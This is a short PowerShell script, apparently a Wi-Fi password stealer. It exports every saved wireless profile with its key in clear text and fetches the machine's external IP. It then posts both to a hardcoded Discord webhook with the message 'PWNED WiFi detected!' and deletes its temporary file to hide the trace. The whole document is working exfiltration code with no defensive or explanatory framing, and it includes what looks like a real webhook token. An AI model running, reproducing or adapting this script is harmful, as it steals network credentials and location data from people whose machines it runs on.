
$wifiProfiles = netsh wlan export profile key=clear

$wifiFile = "$env:TEMP\wifi.txt"
$wifiProfiles | Out-File -FilePath $wifiFile

$ip = Invoke-RestMethod "http://myexternalip.com/raw"

$webhookUrl = "https://discord.com/api/webhooks/1163945552556335248/2grUaOZierXldHcH2vuCbPmutvlPf6znNg22Ms87dyFRZbGv_Quk2NgbDYtPXFfZ63nu"

# Mensagem que será enviada ao Discord
$message = @{
    content = "PWNED WiFi detected! IP: $ip"
    embeds = @(
        @{
            title = "WiFi Information"
            description = Get-Content -Path $wifiFile | Out-String
            color = 16711680
        }
    )
}

Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($message | ConvertTo-Json -Depth 3) -ContentType "application/json"

Remove-Item -Path $wifiFile -Force
